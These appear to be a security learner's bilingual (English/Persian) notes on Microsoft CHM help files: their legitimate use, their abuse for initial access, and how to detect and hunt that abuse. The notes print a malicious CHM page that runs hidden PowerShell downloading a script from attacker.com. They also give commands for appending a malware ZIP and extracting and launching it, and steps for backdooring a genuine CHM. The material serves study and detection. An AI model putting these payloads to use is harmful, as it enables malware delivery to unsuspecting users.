
### CHMs

. Microsoft's Compiled Help Message files.
. Still supported on Win11, not seen abused that much in the wild.
. Just a bunch of HTML files & resources packed into a single file.
. Their Ul is really sluggish, ugly. One could even say revolting ...
. Can be used to run a system command whenever user browses into a backdoored page.
. Command execution results from MSHTML instantiating Internet.HHCtrl.1 COM object
. after processing rogue OBJECT CLASSID=,clsid:[ ... ]">
. Then we specify that Bitmap to display is pointed to by the Windows Shortcut.
. We can APPEND some data to .CHM and that won't corrupt their structure, think of:
. Append .ZIP containing Malware to .CHM
. When CHM opened, run Powershell that extracts .ZIP out of .CHM and deploys Malware. (we'll revisit this idea in embed-zip LNK)
. We can decompile existing .CHM -> backdoor it -> compile it back.


# کاربرد عادی CHM Files

---

## منظور اصلی طراحی

**Compiled HTML Help (CHM)** در سال ۱۹۹۷ توسط مایکروسافت معرفی شد به عنوان:

### ۱. سیستم Help آفلاین نرم‌افزارها

نرم‌افزار قدیمی ویندوزی
    │
    ├─ منوی Help → F1 press
    │       ↓
    │   فایل .CHM باز میشه
    │       ↓
    │   راهنمای آفلاین با امکانات:
    │       • جستجوی full-text
    │       • Index فهرست مطالب
    │       • Navigation tree
    │       • صفحات HTML با تصاویر
    │
    └─ مثال‌ها:
        • Visual Studio 6.0 → MSDN Library
        • Office 2003 → راهنمای آفلاین
        • WinRAR → Help.chm
        • 7-Zip → 7-zip.chm


---

## مزایای CHM در زمان طراحی

| ویژگی | فایده |
|-------|-------|
| **Compressed** | صدها صفحه HTML + عکس در یک فایل فشرده |
| **Self-contained** | نیازی به web server یا اینترنت نداره |
| **Full-text search** | موتور جستجوی داخلی سریع |
| **Hyperlink support** | لینک‌های داخلی بین صفحات |
| **Context-sensitive Help** | برنامه می‌تونه مستقیماً صفحه مورد نظر رو باز کنه |

---

## مثال‌های عملی

### مورد استفاده ۱: راهنمای نرم‌افزار

C:\Program Files\MyApp\
    ├── MyApp.exe
    └── Help.chm   ← کاربر روی Help کلیک میکنه، این باز میشه


**داخل برنامه:**
```csharp
// کد C# برای باز کردن صفحه خاص Help:
Help.ShowHelp(this, "Help.chm", HelpNavigator.Topic, "configuration.htm");
```

---

### مورد استفاده ۲: مستندات فنی

Documentation Package:
    API_Reference.chm
        ├── Index (تمام توابع با توضیح)
        ├── Examples (کدهای نمونه)
        ├── FAQ
        └── Troubleshooting

→ دانلود یکباره، استفاده بدون نت


**قبل از GitHub Pages و ReadTheDocs:**
- شرکت‌ها CHM رو برای API docs استفاده می‌کردن
- SDK های مایکروسافت همشون CHM بودن

---

### مورد استفاده ۳: کتاب‌های الکترونیکی

eBook.chm
    ├── Chapter 1
    ├── Chapter 2
    ├── ...
    └── Search + ToC داخلی

→ جایگزین PDF در محیط ویندوز


---

## چرا دیگه زیاد استفاده نمیشه؟

| دلیل | جایگزین |
|------|---------|
| محدود به ویندوز | HTML5 / Web-based docs |
| مشکلات امنیتی | Markdown → static site |
| UI قدیمی | Interactive web apps |
| عدم پشتیبانی موبایل | Responsive websites |
| Block شدن در شبکه‌ها | Online knowledge bases |

---

## نمونه‌های معروف که هنوز CHM دارن

```bash
# بعضی نرم‌افزارهای قدیمی ولی پرکاربرد:
• 7-Zip
• Notepad++
• Paint.NET (نسخه‌های قدیمی)
• برخی ابزارهای صنعتی (SCADA, PLC programming tools)
• نرم‌افزارهای حسابداری legacy
```

---

## ساختار یک CHM معمولی

Help.chm
    │
    ├─ [Table of Contents]
    │   ├─ Getting Started
    │   │   ├─ Installation
    │   │   └─ First Steps
    │   ├─ Advanced Features
    │   └─ Troubleshooting
    │
    ├─ [Index]
    │   ├─ API
    │   ├─ Configuration
    │   └─ Error codes
    │
    └─ [Search]
        → full-text search engine داخلی


---

## خلاصه

**استفاده مشروع:**
- راهنمای نرم‌افزار (معمولاً legacy)
- مستندات فنی قابل توزیع
- eBook های ویندوزی

**وضعیت امروز:**
- تقریباً منسوخ شده
- جایگزین‌ها: web-based help, PDF, Markdown docs
- ولی **هنوز روی ویندوز کار می‌کنه** ← همین باعث شده threat actor ها ازش استفاده کنن



# CHM Files as Initial Access Vector

---

## CHM چیست؟

**Compiled HTML Help** — فرمت کمک‌های آفلاین مایکروسافت از ده ۹۰.

.CHM File Structure:
├── HTML files (content pages)
├── Images & Resources
├── Index (.hhk)
├── Table of Contents (.hhc)
└── Project file (.hhp)
→ همه اینا packed میشن توی یه فایل binary با فرمت ITS/ITSS


**چرا هنوز خطرناکه؟**
- Windows 11 هنوز fully support می‌کنه
- آتی‌ویروس‌ها کمتر روش focus دارن
- کاربران بهش اعتماد دارن (فایل Help به نظر بی‌خطر میاد)

---

## مکانیزم اجرای کد

### زنجیره فنی:

User opens .CHM
      │
      ▼
h.exe (Windows Help Viewer)
      │
      ▼
MSHTML engine پردازش HTML
      │
      ▼
تگ OBJECT CLASSID="{clsid:...}" پیدا میشه
      │
      ▼
Internet.HHCtrl.1 COM Object instantiate میشه
      │
      ▼
اجرای System Command


### کد مخرب داخل CHM:

```html
<!-- صفحه HTML داخل CHM -->
<HTML>
<BODY>
  <!-- این object باعث اجرای دستور میشه -->
  <OBJECT 
    id="xss" 
    classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
    width="1" height="1">
    <!-- Bitmap به یه .LNK اشاره میکنه -->
    <PARAM name="Command" value="ShortCut">
    <PARAM name="Button"  value="Bitmap:shortcut">
    <PARAM name="Item1"   value=',cmd,/c powershell -w h -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'>
    <PARAM name="Item2"   value="273,1,1">
  </OBJECT>

  <!-- trigger کردن -->
  <SCRIPT>xss.Click();</SCRIPT>
</BODY>
</HTML>
```

**نکته کلیدی:** این COM object اصالتاً برای shortcut buttons در Help فایل‌ها طراحی شده — مایکروسافت خودش این feature رو گذاشته.

---

## تکنیک ۱: Append ZIP به CHM

### چرا کار می‌کنه؟

CHM binary format:
┌─────────────────────────┐
│   CHM Header & Metadata     │
├─────────────────┤
│   Compressed HTML Content   │
├────────────────┤
│   CHM End Marker            │  ← CHM parser اینجا متوقف میشه
├─────────────────────────────┤  
│   APPENDED ZIP FILE         │  ← نادیده گرفته میشه توسط CHM
│   (contains malware)        │  ← ولی ZIP parser میتونه بخونه
└─────────────────┘


**ZIP format از آخر فایل خونده میشه** (End of Central Directory)، پس:
- CHM → ساختار خودش رو میبینه، سالم
- ZIP tools → داده append شده رو میبینن

### اجرا:

```bash
# ساخت CHM + Append کردن ZIP:
cat backdored.chm malware.zip > final_payload.chm

# داخل CHM، PowerShell این کار رو میکنه:
```

```powershell
# کد داخل HTML در CHM:
$chm_path = (Get-Process h).MainModule.FileName
# یا:
$chm_path = [System.IO.Path]::GetFullPath("$env:TEMP\document.chm")

# Extract کردن ZIP از داخل CHM:
Add-Type -Assembly System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::OpenRead($chm_path)
foreach ($entry in $zip.Entries) {
    $dest = "$env:APPDATA\$($entry.Name)"
    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $dest, $true)
}
$zip.Dispose()

# اجرای malware:
Start-Process "$env:APPDATA\payload.exe"
```

---

## تکنیک ۲: Backdoor کردن CHM موجود

### فرایند:

CHM اصلی (معتبر)
      │
      ▼ decompile
  h.exe -decompile output_dir original.chm
      │
      ▼ backdoor
  اضافه کردن صفحه مخرب یا تغییر صفحه موجود
      │
      ▼ recompile
  hhc.exe project.hhp → backdored.chm
      │
      ▼
توزیع به عنوان فایل Help معتبر


```bash
# Decompile:
hh.exe -decompile C:\output C:\original.chm

# ساختار output:
# C:\output\
#   ├── index.htm
#   ├── page1.htm
#   ├── page2.htm   ← اینجا payload اضافه میشه
#   └── images\

# بعد از backdoor کردن، recompile:
hhc.exe project.hhp
```

---

## ارتباط با Embed-ZIP LNK

این ایده (append data به فایل) در **LNK files** هم استفاده میشه:

LNK File:
┌─────────────────┐
│   LNK Header                │
├─────────────────┤
│   Shortcut Metadata         │
│   (target, icon, args...)   │
├────────────────┤
│   LNK End                │
├─────────────────────────────┤
│   EMBEDDED ZIP              │  ← LNK parser نادیده میگیره
│   (malware inside)          │  ← PowerShell میتونه بخونه
└────────────────────┘


همون منطق، بردار متفاوت — که بعداً بهش برمیگردیم.

---

## Detection

# 1. Process tree مشکوک:
h.exe → cmd.exe / powershell.exe
        ↑ این رابطه parent-child نباید وجود داشته باشه

# 2. Sysmon Event ID 1 (Process Create):
ParentImage: C:\Windows\h.exe
Image: C:\Windows\System32\cmd.exe

# 3. فایل‌های CHM از اینترنت:
Zone.Identifier ADS → Zone=3 (Internet)

# 4. CLSID در محتوای CHM:
adb880a6-d8ff-11cf-9377-00aa003b7a11


---

## خلاصه بردارها

| تکنیک | مکانیزم | پیچیدگی |
|--------|-------|------|
| Direct Command | OBJECT CLASSID در HTML | کم |
| Append ZIP | CHM + ZIP polyglot | متوسط |
| Backdoor existing | Decompile → modify → recompile | متوسط |
| LNK embed (بعداً) | همان ایده، فرمت LNK | متوسط |

---


![[Pasted image 20260612233331.png]]

پس پروسه یی که این فایل help هارو dcompile میکنه hh.exe هستش
پس ما تو فرایند hunting باید به دنبال رویداد بعد از پروسه hh شیم 

![[Pasted image 20260612233524.png]]

بعد از اون این lolbinsرو میبینیم
